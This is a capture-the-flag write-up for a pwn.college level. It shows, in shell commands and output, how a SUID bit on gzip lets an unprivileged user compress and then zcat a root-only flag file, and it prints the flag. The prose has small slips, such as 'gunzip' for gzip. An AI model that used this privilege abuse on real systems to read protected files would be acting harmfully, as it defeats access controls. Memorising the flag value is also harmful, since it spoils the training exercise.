This challenge is a part of a series of programs that forces to understand different archive formats.

Here first we can see that there is 'flag' but it is only readable by the root user.

```bash
hacker@program-misuse-level-17:~$ ls
Desktop
hacker@program-misuse-level-17:~$ cd /
hacker@program-misuse-level-17:/$ ls
bin  boot  challenge  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse-level-17:/$ ls -l flag 
-r-------- 1 root root 57 Dec 31 03:27 flag
hacker@program-misuse-level-17:/$ cat flag
cat: flag: Permission denied
```

Then we run the executable file named 'babysuid_level17' in the challenge directory. It will turn the suid bit of gzip. Now we can run the gzip command without root permission. Suid bit will escalate our priviledge and turn our uid to 0 from 1000. Please read the theory.

```bash
hacker@program-misuse-level-17:/challenge$ ./babysuid_level17 
Welcome to ./babysuid_level17!

This challenge is part of a series of programs that
force you to understand different archive formats.

I just set the SUID bit on /usr/bin/gzip.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level17) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/gzip!
```

now we gunzip the flag file. It will create a .gz file. But how can we read the content of the flag.gz file. We don't have the permission to use cat. more or less or other file reading command because we are not root.

```bash
hacker@program-misuse-level-17:/$ whoami
hacker
```

`There is a command called zcat or gzcat to print the contents of a commpressed file using 'gzip' without decompressing it.`

```bash
hacker@program-misuse-level-17:/challenge$ ls -l /usr/bin/gzip
-rwsr-xr-x 1 root root 97496 Apr  8  2022 /usr/bin/gzip
hacker@program-misuse-level-17:/challenge$ cd /
hacker@program-misuse-level-17:/$ ls
bin  boot  challenge  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse-level-17:/$ gzip flag 
hacker@program-misuse-level-17:/$ ls
bin  boot  challenge  dev  etc  flag.gz  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse-level-17:/$ ls -l flag.gz 
-r-------- 1 root root 82 Dec 31 03:27 flag.gz
hacker@program-misuse-level-17:/$ zcat flag.gz 
pwn.college{cvP6isU-78f2eDnlCHefN5HSsEv.0VO1EDL0AjNzQzW}
```

